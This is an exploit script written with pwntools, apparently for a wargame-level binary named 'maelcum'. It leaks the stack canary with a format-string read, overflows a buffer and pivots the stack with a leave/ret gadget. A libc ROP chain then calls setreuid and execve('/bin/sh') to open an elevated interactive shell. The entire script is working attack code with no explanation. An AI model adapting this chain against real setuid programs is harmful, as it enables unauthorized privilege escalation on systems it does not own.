import sys
from pwn import *

context.arch = 'amd64'
io = process("/home/level08/maelcum")

RELAY_BUFF_ADDR = 0x404200

io.recvuntil(b"(who's asking?): ")
io.sendline(b"%17$p")
io.recvuntil(b"Logging relay tag: ")
stack_canary = io.recvline().decode().strip()[2:]
io.recvuntil(b"Send it: ")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc.address = 0x7ffff7c00000

rop = ROP(libc)

ROP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
ROP_RSI = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]

SETREUID = libc.sym["setreuid"]
EXECVE = libc.sym["execve"]

BIN_SH = next(libc.search(b"/bin/sh"))

rop_chain = b""
rop_chain += p64(ROP_RDI)
rop_chain += p64(1025)
rop_chain += p64(ROP_RSI)
rop_chain += p64(1025)
rop_chain += p64(0xdeadbeef)
rop_chain += p64(SETREUID)
rop_chain += p64(ROP_RDI)
rop_chain += p64(BIN_SH)
rop_chain += p64(ROP_RSI)
rop_chain += p64(0)
rop_chain += p64(0xdeadbeef)
rop_chain += p64(EXECVE)


payload = b"RELAY:511"
payload += b"A" * (40 - len(payload))
payload += p64(int(stack_canary, 16))
payload += p64(RELAY_BUFF_ADDR)
payload += p64(rop.find_gadget(["leave", "ret"]).address)

# mov rsp, rbp
# pop rbp

io.send(payload)
io.recvuntil(b"bytes: ")

payload = b"A" * 8
payload += rop_chain

io.send(payload)

io.interactive()